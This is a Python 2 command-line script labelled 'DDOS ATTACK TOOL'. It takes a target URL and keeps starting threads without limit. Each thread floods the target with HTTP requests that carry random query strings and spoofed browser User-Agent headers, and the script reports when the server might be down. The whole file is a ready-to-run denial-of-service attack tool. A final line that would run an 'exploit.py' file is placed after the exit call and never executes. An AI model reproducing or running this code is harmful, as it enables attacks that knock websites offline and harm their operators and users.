import os
import sys
import urllib2
import threading
import random
import time


def cls():
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])
def print_logo():
        print ("""------------------------------------------------""")
        print ("""	  DDOS ATTACK TOOL """)
        print ("""------------------------------------------------""")

cls()
print_logo()
try:
    print ("\033[1;32m")
    url = raw_input("URL:  ").strip()
    print ("\033[1;m")

    count = 0
    headers = []
    referer = {
        "https://duckduckgo.com/",
        "https://www.google.com/",
        "https://www.youtube.com"
    }


    def useragent():
        global headers
        headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
        headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
        headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")

        return headers


    def ascii(size):
        out_str = ''

        for e in range(0, size):
            code = random.randint(65, 90)
            out_str += chr(code)
        
        return out_str

    class httpth1(threading.Thread):
        def run(self):
            global count
            while True:
                try:
                    req = urllib2.Request(url + "?" + ascii(random.randint(3, 10)))
                    req.add_header("User-Agent", random.choice(useragent()))
                    req.add_header("Referer", referer)
                    urllib2.urlopen(req)
                    count += 1
                    print ("{0} Dos Sent".format(count))
                except urllib2.HTTPError:
                    print ("\033[1;34m SERVER MIGHT ME DOWN \033[1;m")
                    pass
                except urllib2.URLError:
                    print ("{0} Dos Sent".format(count))
                    sys.exit()
                except ValueError:
                    print ("\033[1;34m [-]Check You're URL \033[1;m")
                    sys.exit()
                except KeyboardInterrupt:
                    exit("\033[1;34m [-]Canceled By User \033[1;m")
                    sys.exit()
                    
    while True:
        try:
            th1 = httpth1()
            th1.start()
        except Exception:
            pass
        except KeyboardInterrupt:
            exit("\033[1;34m [-]Canceled By User \033[1;m")
except KeyboardInterrupt:
    print('\033[97m\nGoing Back...\033[1;m')
    time.sleep(1)
    cls()
    sys.exit()
    os.system(" chmod +x exploit.py && python2 exploit.py")
      